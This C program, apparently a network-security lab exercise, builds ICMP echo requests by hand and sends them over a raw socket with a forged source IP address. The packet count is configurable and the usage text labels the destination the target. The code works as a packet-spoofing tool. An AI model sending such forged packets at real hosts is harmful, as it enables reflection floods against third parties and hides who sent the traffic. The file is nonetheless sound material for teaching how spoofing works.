#include <pcap.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

/* Ethernet Header */
struct ethheader {
        u_char ether_dhost[6]; /* Destination host address */
        u_char ether_shost[6]; /* Source host address */
        u_short ether_type;    /* protocol type (IP, ARP, RARP, etc) */
};

/* IP Header */
struct ipheader {
        unsigned char           iph_ihl:4, // IP header length
                                iph_ver:4; // IP version
        unsigned char           iph_tos;   // Type of Service
        unsigned short int      iph_len;   // Packet Length
        unsigned short int      iph_ident; // Identification
        unsigned short int      iph_flag:3,// Fragmentation flags
                                iph_offset:13; // Flags offset
        unsigned char           iph_ttl;   // Time to live
        unsigned char           iph_protocol; // Protocol type
        unsigned short int      iph_chksum;// IP datagram checksum
        struct  in_addr         iph_sourceip; // Source IP address
        struct  in_addr         iph_destip;   // Destination IP address
};

/* TCP Header */
struct tcpheader {

        unsigned short int      tcph_sport;     // Source Port
        unsigned short int      tcph_dport;     // Destination Port
        unsigned int            tcph_seq;       // Sequence number
        unsigned int            tcph_ack;       // Acknowledgement Number
        unsigned char           tcph_offs;      // data offset
#define TH_OFF(th)      (((th)->tcph_offs & 0xf0) >> 4)
        unsigned char           tcph_flags;     // TCP flags
#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80
#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        unsigned short int      tcph_win;       // Window
        unsigned short int      tcph_sum;       // checksum
        unsigned short int      tcph_urp;       // urgent pointer

};


/* ICMP header */

struct icmpheader {
	unsigned char	icmp_type;      // ICMP message type
	unsigned char	icmp_code;      // error code
	unsigned short int icmp_chksum; //Checksum for ICMP header and data
	unsigned short int icmp_id;	//Identifier
	unsigned short int icmp_seq;    // Sequence number
};

unsigned short in_cksum (unsigned short *buf, int length);
void send_raw_ip_packet (struct ipheader* ip);

/***********************************************************************
 * Calculate a checksum for a given buffer
 **********************************************************************/
unsigned short in_cksum (unsigned short *buf, int length)
{
	unsigned short *w = buf;
	int nleft = length;
	int sum = 0;
	unsigned short temp = 0;
	
	/* The algorithm uses a 32-bit accumulator (sum), adds
	 * sequential 16 bit words to it, and at the end, folds
	 * back all the carry bits from the top 16 bits into the lower 16 bits.
	 */

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	/* treat the odd byte at the end (if any) */
	if (nleft == 1) {
		*(u_char *)(&temp) = *(u_char *)w ;
		sum += temp;
	}

	/* Add back carry outs from the top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff); // add hi 16 to low 16
	sum += (sum >> 16); // add carry
	return (unsigned short)(~sum);


}


/***********************************************************************
 * Given a IP packet, send it out using a raw socket.
 ***********************************************************************/
void send_raw_ip_packet (struct ipheader* ip)
{
	struct sockaddr_in dest_info;
	int enable = 1;

	// Create raw network socket.
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	// Step 2 Set Socket option.
	setsockopt(sock, IPPROTO_ICMP, IP_HDRINCL, &enable, sizeof(enable));

	// Step 3 provide needed information about destination.
	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip->iph_destip;

	//Step 4 send the packet out
	sendto(sock, ip, ntohs(ip->iph_len), 0,
			(struct sockaddr *)&dest_info, sizeof(dest_info));
	close(sock);
}



/* Spoof an ICMP echo request using an arbitrary IP address */
int main(int argc, char *argv[]) {

	int i;
	char buffer[1500];
	int num = 30;

	if(argc < 3)
	{
		printf("\nUsage: %s <sourceIP> <destinationIP> [number]\n", argv[0]);
		printf(" -sourceIP is the spoofed source address\n");
		printf(" -destinationIP is the target\n");
		printf("- number is the number of packets to send, 30 by default\n");
		exit(1);
	}
	
	if(argc == 4)
		num = atoi(argv[3]);

	for(i=1; i<=num; i++)
	{
	
	        memset(buffer, 0, 1500);

		/******************************
	 	1. Fill in the ICMP header
		******************************/
	
		struct icmpheader *icmp = (struct icmpheader *)(buffer + sizeof(struct ipheader));
		icmp->icmp_type = 8; // Type 8 is echo request, 0 is reply.
		icmp->icmp_seq = 69;
		icmp->icmp_id = 420;
		//Calculate checksum for integrity
		icmp->icmp_chksum = 0;
		icmp->icmp_chksum = in_cksum((unsigned short *) icmp, sizeof(struct icmpheader));

		/******************************
	 	2. Fill in the IP Header
		******************************/

		struct ipheader *ip = (struct ipheader *) buffer;
		ip->iph_ver = 4;
		ip->iph_ihl = 5;
		ip->iph_ttl = 20;
		ip->iph_sourceip.s_addr = inet_addr(argv[1]);
		ip->iph_destip.s_addr = inet_addr(argv[2]);
		ip->iph_protocol = IPPROTO_ICMP;
		ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct icmpheader));

		printf("Sending from %s (spoofed address) to %s\n", inet_ntoa(ip->iph_sourceip), argv[2]);

		/*******************************
	 	3. Send the spoofed packet
		******************************/
		send_raw_ip_packet(ip);
	}
	return 0;
}
